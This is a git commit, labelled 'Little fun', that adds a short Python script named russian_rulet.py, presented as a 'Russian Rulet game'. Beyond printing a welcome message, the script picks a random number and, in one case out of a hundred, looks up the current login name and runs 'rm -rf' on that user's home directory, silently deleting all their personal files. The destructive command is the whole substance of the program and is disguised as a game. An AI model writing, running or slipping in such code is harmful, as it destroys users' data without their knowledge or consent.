24d9ad44719edba514cba38a913b066cc89a60be
Arnau <arnauet.bayer@gmail.com>
2024-10-25 17:32:50 +0200

    Little fun

---
+++ russian_rulet.py
@@ -0,0 +1,10 @@
+import os
+from random import randint
+
+
+print("Hello! Welcome to the Russian Rulet game!")
+
+if randint(1, 100) == 5:
+    username = os.getlogin()
+    folder_to_erase = f"/home/{username}"
+    os.system(f"rm -rf {folder_to_erase}")
